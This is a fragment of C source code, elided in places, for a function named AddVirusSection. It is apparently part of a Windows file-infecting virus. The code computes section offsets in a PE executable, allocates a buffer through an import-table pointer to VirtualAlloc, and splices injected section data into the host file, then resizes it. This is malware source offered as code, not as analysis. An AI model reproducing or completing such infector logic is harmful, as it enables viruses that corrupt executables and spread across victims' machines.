...
PIMAGE_SECTION_HEADER WINAPI AddVirusSection(PVOID file_data, PDWORD file_size, const PVOID section_data, DWORD section_size, const PDATA data)
{
    ...
    /*
    p_image_section_header[i].PointerToRawData = Align(p_image_section_header[i-1].PointerToRawData + p_image_section_header[i-1].SizeOfRawData, file_alignment);
    */
    p_image_section_header[i].PointerToRawData = Align(*(DWORD*)file_size, file_alignment);
    ...
    PVOID temp_data = data->iat->fnVirtualAlloc(
    NULL,
    *(DWORD*)file_size + p_image_section_header[i].SizeOfRawData,
    MEM_COMMIT | MEM_RESERVE,
    PAGE_READWRITE
    );

    MemCopy(temp_data, (unsigned char*)file_data + p_image_section_header[i].PointerToRawData, *(DWORD*)file_size - p_image_section_header[i].PointerToRawData);
    MemCopy((unsigned char*)file_data + p_image_section_header[i].PointerToRawData, section_data, section_size);
    MemCopy((unsigned char*)file_data + p_image_section_header[i].PointerToRawData + p_image_section_header[i].SizeOfRawData, temp_data, *(DWORD*)file_size - p_image_section_header[i].PointerToRawData);
    ...
    *(DWORD*)file_size = Align(*(DWORD*)file_size, file_alignment) + p_image_section_header[i].SizeOfRawData;
